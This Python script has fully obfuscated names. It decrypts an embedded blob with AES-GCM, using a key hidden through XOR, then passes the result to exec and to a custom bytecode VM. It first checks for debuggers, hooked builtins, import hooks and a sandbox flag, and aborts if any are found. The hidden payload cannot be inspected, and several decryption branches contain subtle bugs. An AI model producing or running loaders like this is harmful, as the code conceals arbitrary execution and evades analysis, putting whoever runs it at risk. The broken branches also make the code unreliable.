#!/usr/bin/env python3
def _rkuktse(_rjc):
    return _rjc % 6599 + 1

import hashlib as _qbaygsc, hmac as _shw, base64 as _szehdg, sys as _zyrz, zlib as _brirw
_rjc = 40575
_kotmnz = """8JhaVs4EiSZ5EwYY1k6lJ+rrY4qjgIIdaGR2jbA544CHRTKUqA2WqxNLYPdokns8pD41wl2RqinM44FIjQShAB7Kk1MhunIaZAxKO4FR/APYMNh1FywkkonAl74cK3I1WQ7f+ClLm6YHbcfz67n7fjlqaGWpidu62Z7mf50rMjkBKVQ7AbQmNCzPJn+QAO0p1s3MHriqZgpPSUFhbuLtql9WwjzWjXZtdZIRSImI3OQsHyAQQuZaSKs2xGd5zEtt3Y55zSNSzDLQeI7mTzPmi8zBw5pQMLw0HUS40Tr3CwnuVWVNKt58xA=="""
_rhzzdv = 3
_canp = _rkuktse(_rjc)

def _vm_run(_code, _consts, _names, _globals, _locals):
    _r = [None] * 64
    _ip = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    while _ip < _n:
        _op = _code[_ip]
        _rd = _code[_ip + 1]
        _rs1 = _code[_ip + 2]
        _rs2 = _code[_ip + 3]
        _imm = _code[_ip + 4] | (_code[_ip + 5] << 8) | (_code[_ip + 6] << 16) | (_code[_ip + 7] << 24)
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 32:
            if not _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            import sys as _s
            _s.stderr.write(f"[vm] CALL rd={_rd} rs1={_rs1} argc={_imm} fn_type={type(_fn).__name__} fn={_fn!r} args={_args!r}\n")
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*_r[_rs1:_rs1 + (_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1:_rs1 + _rs2])
        elif _op == 44:
            _r[_rd] = list(_r[_rs1:_rs1 + _rs2])
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm * 8
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            if _imm == 0:
                if not (_v + 1 == _v): pass
            elif _imm == 1:
                if not (_v != _v): pass
            else:
                if not (_v - 1 == _v): pass
        elif _op == 53:
            _v = _r[_rs1]
            if _imm == 0:
                if _v * 0 != 0: pass
            elif _imm == 1:
                if _v != _v: pass
            else:
                if _v + 1 == _v: pass
        _ip += 8

def _vm_deserialize(_data):
    _pos = 0
    _hl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _hot = _data[_pos:_pos+_hl].decode('utf-8'); _pos += _hl
    _cc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _data[_pos]; _pos += 1
        _sl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
        _s = _data[_pos:_pos+_sl]; _pos += _sl
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 6: _v = eval(_s)
        elif _t == 7: _v = _s
        elif _t == 8: _v = eval(_s)
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_data[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_data[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    _ic = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _code = _data[_pos:_pos+_ic*8]
    return _hot, _code, _consts, _names

def _ayn():
    if _zyrz.gettrace() is not None:
        _zyrz.stderr.write('error: debugger detected\n'); _zyrz.exit(1)
    _cbcfhoh = bytes.fromhex("2819121b1f04462f0e0d0a1e071f46200e12461d5a455b")
    _cbcfhoh = bytes(_ ^ 107 for _ in _cbcfhoh).decode()
    _zyrz.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _zyrz.modules:
            _zyrz.stderr.write('error: debugger detected\n'); _zyrz.exit(1)
    _hgnja = _szehdg.b64decode(_kotmnz)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_zyrz.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _zyrz.stderr.write('error: hook detected\n'); _zyrz.exit(1)
    if len(_zyrz.meta_path) > 5:
        _zyrz.stderr.write('error: import hook detected\n'); _zyrz.exit(1)
    if getattr(_zyrz, 'flags', None) and _zyrz.flags.no_user_site:
        _zyrz.stderr.write('error: sandbox detected\n'); _zyrz.exit(1)
    if _rhzzdv == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gnlen, algorithms as _gg, modes as _lpydjx
        except ImportError:
            _zyrz.stderr.write("error: cryptography not installed\n"); _zyrz.exit(1)
        _niyake = _hgnja[:16]; _aqad = _hgnja[-32:]; _rdu = _hgnja[16:-32]
        _fmho = _qbaygsc.pbkdf2_hmac('sha256', _cbcfhoh.encode(), _niyake, 100000, dklen=64)
        _qx = _fmho[:32]; _nibnkls = _fmho[32:64]
        _ex = _shw.new(_nibnkls, _rdu, _qbaygsc.sha256).digest()
        if not _shw.compare_digest(_aqad, _ex):
            _zyrz.stderr.write("error: integrity check failed\n"); _zyrz.exit(1)
        _aaqa = _gnlen(_gg.AES(_qx), _lpydjx.ECB())
        _jiqswmi = _aaqa.decryptor().update(_rdu) + _aaqa.finalize()
        _jiqswmi = _jiqswmi[-1]
        if _jiqswmi < 1 or _jiqswmi > 16 or not all(_ == _jiqswmi for _ in _jiqswmi[-_jiqswmi:]):
            _zyrz.stderr.write("error: decryption failed\n"); _zyrz.exit(1)
        _jiqswmi = _jiqswmi[:-_jiqswmi]
    elif _rhzzdv == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gnlen, algorithms as _gg, modes as _lpydjx
        except ImportError:
            _zyrz.stderr.write("error: cryptography not installed\n"); _zyrz.exit(1)
        _niyake = _hgnja[:16]; _aqad = _hgnja[-32:]; _rdu = _hgnja[16:-32]
        _fmho = _qbaygsc.pbkdf2_hmac('sha256', _cbcfhoh.encode(), _niyake, 100000, dklen=80)
        _qx = _fmho[:32]; _zxebv = _fmho[32:48]; _nibnkls = _fmho[48:80]
        _ex = _shw.new(_nibnkls, _rdu, _qbaygsc.sha256).digest()
        if not _shw.compare_digest(_aqad, _ex):
            _zyrz.stderr.write("error: integrity check failed\n"); _zyrz.exit(1)
        _aaqa = _gnlen(_gg.ChaCha20(_qx, _zxebv), mode=None)
        _jiqswmi = _aaqa.decryptor().update(_rdu)
    elif _rhzzdv == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gnlen, algorithms as _gg, modes as _lpydjx
        except ImportError:
            _zyrz.stderr.write("error: cryptography not installed\n"); _zyrz.exit(1)
        _niyake = _hgnja[:16]; _aqad = _hgnja[-32:]; _rdu = _hgnja[16:-32]
        _fmho = _qbaygsc.pbkdf2_hmac('sha256', _cbcfhoh.encode(), _niyake, 100000, dklen=80)
        _qx = _fmho[:32]; _zxebv = _fmho[32:48]; _nibnkls = _fmho[48:80]
        _ex = _shw.new(_nibnkls, _rdu, _qbaygsc.sha256).digest()
        if not _shw.compare_digest(_aqad, _ex):
            _zyrz.stderr.write("error: integrity check failed\n"); _zyrz.exit(1)
        _aaqa = _gnlen(_gg.AES(_qx), _lpydjx.CBC(_zxebv))
        _jiqswmi = _aaqa.decryptor().update(_rdu) + _aaqa.finalize()
        _jiqswmi = _jiqswmi[-1]
        if _jiqswmi < 1 or _jiqswmi > 16 or not all(_ == _jiqswmi for _ in _jiqswmi[-_jiqswmi:]):
            _zyrz.stderr.write("error: decryption failed\n"); _zyrz.exit(1)
        _jiqswmi = _jiqswmi[:-_jiqswmi]
    elif _rhzzdv == 10:
        _jiqswmi = bytes.fromhex(_hgnja.decode('ascii'))
    elif _rhzzdv == 6:
        _jiqswmi = _szehdg.b64decode(_hgnja)
    elif _rhzzdv == 7:
        _jiqswmi = _szehdg.b32decode(_hgnja)
    elif _rhzzdv == 8:
        _rsm = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _lnnzhox = {c:i for i,c in enumerate(_rsm)}
        def _agmjv(_plnvr):
            _gi = bytearray(); _krzz = 0
            while _krzz < len(_plnvr):
                _smmfbz = 0; _jn = 0
                while _krzz < len(_plnvr) and _jn < 5:
                    _smmfbz = _smmfbz * 85 + _lnnzhox[chr(_plnvr[_krzz])]; _krzz += 1; _jn += 1
                _mpmaa = _jn - 1
                if _mpmaa > 0: _gi.extend(_smmfbz.to_bytes(4, 'big')[4-_mpmaa:])
            return bytes(_gi)
        _jiqswmi = _agmjv(_hgnja)
    elif _rhzzdv == 5:
        _niyake = _hgnja[:16]; _aqad = _hgnja[-32:]; _rdu = _hgnja[16:-32]
        _fmho = _qbaygsc.pbkdf2_hmac('sha256', _cbcfhoh.encode(), _niyake, 100000, dklen=64)
        _qx = _fmho[:32]; _nibnkls = _fmho[32:64]
        _ex = _shw.new(_nibnkls, _rdu, _qbaygsc.sha256).digest()
        if not _shw.compare_digest(_aqad, _ex):
            _zyrz.stderr.write("error: integrity check failed\n"); _zyrz.exit(1)
        _jiqswmi = bytes(_rdu[i] ^ _qx[i % 32] for i in range(len(_rdu)))
    elif _rhzzdv == 9:
        def _zps(_kltrt):
            if _kltrt[:2] == b'<~': _kltrt = _kltrt[2:]
            if _kltrt[-2:] == b'~>': _kltrt = _kltrt[:-2]
            _dkzev = bytearray(); _shyui = 0
            while _shyui < len(_kltrt):
                if _kltrt[_shyui] == 122:
                    _dkzev.extend(b'\x00\x00\x00\x00'); _shyui += 1; continue
                _dx = 0; _rotrp = 0
                while _shyui < len(_kltrt) and _rotrp < 5:
                    _dx = _dx * 85 + (_kltrt[_shyui] - 33); _shyui += 1; _rotrp += 1
                _sev = _rotrp - 1
                if _sev > 0: _dkzev.extend(_dx.to_bytes(4, 'big')[4-_sev:])
            return bytes(_dkzev)
        _jiqswmi = _zps(_hgnja)
    elif _rhzzdv == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gnlen, algorithms as _gg, modes as _lpydjx
        except ImportError:
            _zyrz.stderr.write("error: cryptography not installed\n"); _zyrz.exit(1)
        _niyake = _hgnja[:16]; _aqad = _hgnja[-32:]; _rdu = _hgnja[16:-32]
        _fmho = _qbaygsc.pbkdf2_hmac('sha256', _cbcfhoh.encode(), _niyake, 100000, dklen=80)
        _qx = _fmho[:32]; _zxebv = _fmho[32:48]; _nibnkls = _fmho[48:80]
        _ex = _shw.new(_nibnkls, _rdu, _qbaygsc.sha256).digest()
        if not _shw.compare_digest(_aqad, _ex):
            _zyrz.stderr.write("error: integrity check failed\n"); _zyrz.exit(1)
        _aaqa = _gnlen(_gg.AES(_qx), _lpydjx.CTR(_zxebv))
        _jiqswmi = _aaqa.decryptor().update(_rdu)
    elif _rhzzdv == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _uzwvmj
        except ImportError:
            _zyrz.stderr.write("error: cryptography not installed\n"); _zyrz.exit(1)
        _niyake = _hgnja[:16]; _aqad = _hgnja[-32:]; _jiqswmi = _hgnja[16:-32]
        _rdu = _jiqswmi[:-16]; _visbl = _jiqswmi[-16:]
        _fmho = _qbaygsc.pbkdf2_hmac('sha256', _cbcfhoh.encode(), _niyake, 100000, dklen=76)
        _qx = _fmho[:32]; _zxebv = _fmho[32:44]; _nibnkls = _fmho[44:76]
        _ex = _shw.new(_nibnkls, _jiqswmi, _qbaygsc.sha256).digest()
        if not _shw.compare_digest(_aqad, _ex):
            _zyrz.stderr.write("error: integrity check failed\n"); _zyrz.exit(1)
        _jiqswmi = _uzwvmj(_qx).decrypt(_zxebv, _rdu + _visbl, None)
    else:
        _zyrz.stderr.write("error: unsupported algorithm\n"); _zyrz.exit(1)
    _jiqswmi, _c, _k, _m = _vm_deserialize(_jiqswmi[4:])
    exec(compile(_jiqswmi, '<vm>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals())
if __name__ == '__main__':
    _ayn()
